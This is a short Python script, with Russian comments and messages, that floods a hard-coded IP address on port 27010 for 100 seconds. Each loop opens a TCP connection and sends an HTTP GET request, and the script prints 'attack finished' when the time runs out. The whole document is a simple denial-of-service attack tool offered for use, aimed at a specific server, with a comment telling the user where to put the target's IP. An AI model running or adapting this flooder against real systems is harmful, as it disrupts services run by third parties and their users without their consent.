import socket
import random
import time

target_ip = "135.181.76.187"  # сюда айпи 
target_port = 27010
duration = 100

def send_data(target_ip, target_port):
    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.settimeout(1)
        client.connect((target_ip, target_port))
        client.send(b"GET / HTTP/1.1\r\nHost: " + target_ip.encode() + b"\r\n\r\n")
        client.close()
    except Exception as e:
        print(f"Ошибка: {e}")

start_time = time.time()
while time.time() - start_time < duration:
    send_data(target_ip, target_port)

print("Атака завершена")